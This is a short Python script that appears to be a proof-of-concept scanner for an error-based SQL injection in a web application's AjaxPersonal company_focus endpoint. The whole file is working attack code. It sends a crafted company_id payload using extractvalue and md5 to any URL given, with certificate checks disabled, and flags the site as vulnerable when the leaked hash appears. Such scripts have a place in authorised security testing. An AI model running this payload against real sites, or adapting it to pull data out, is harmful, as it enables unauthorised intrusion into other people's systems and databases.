import requests, re, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def doCheck(url):
    if url[-1] != "/":
        url = url + "/"
    targetUrl = url + 'index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa") and extractvalue(1,concat(0x7e,md5(99999999))) -- a'
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
    response = requests.get(targetUrl, headers=headers, timeout=5, verify=False)
    if "ef775988943825d2871e1cfa75473ec" in response.text:
        return targetUrl
    else:
        return False

